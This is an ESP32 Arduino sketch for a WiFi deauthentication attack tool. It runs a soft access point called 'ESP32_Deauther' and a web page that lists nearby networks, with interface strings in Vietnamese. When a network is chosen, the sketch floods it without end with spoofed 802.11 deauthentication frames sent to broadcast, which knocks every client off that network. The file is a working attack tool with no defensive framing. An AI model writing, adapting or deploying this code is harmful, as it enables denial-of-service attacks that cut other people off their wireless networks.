#include "WiFi.h"
#include "esp_wifi.h"
#include "ESPAsyncWebServer.h"

AsyncWebServer server(80);

String networksHTML;

void sendDeauth(uint8_t *mac, uint8_t channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    0x00, 0x00,
    0x07, 0x00
  };
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void scanNetworks() {
  networksHTML = "<h2>Chon mang de deauth</h2>";
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    networksHTML += "<p><a href=\"/deauth?mac=" + WiFi.BSSIDstr(i) + "&ch=" + String(WiFi.channel(i)) + "\">"
                  + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ")</a></p>";
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ESP32_Deauther", "12345678");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    scanNetworks();
    request->send(200, "text/html", networksHTML);
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("mac") && request->hasParam("ch")) {
      String macStr = request->getParam("mac")->value();
      int ch = request->getParam("ch")->value().toInt();
      uint8_t target_mac[6];
      sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &target_mac[0], &target_mac[1], &target_mac[2],
             &target_mac[3], &target_mac[4], &target_mac[5]);
      request->send(200, "text/html", "Dang deauth " + macStr);
      while (true) sendDeauth(target_mac, ch);
    } else {
      request->send(400, "text/plain", "Thieu tham so");
    }
  });

  server.begin();
}

void loop() {}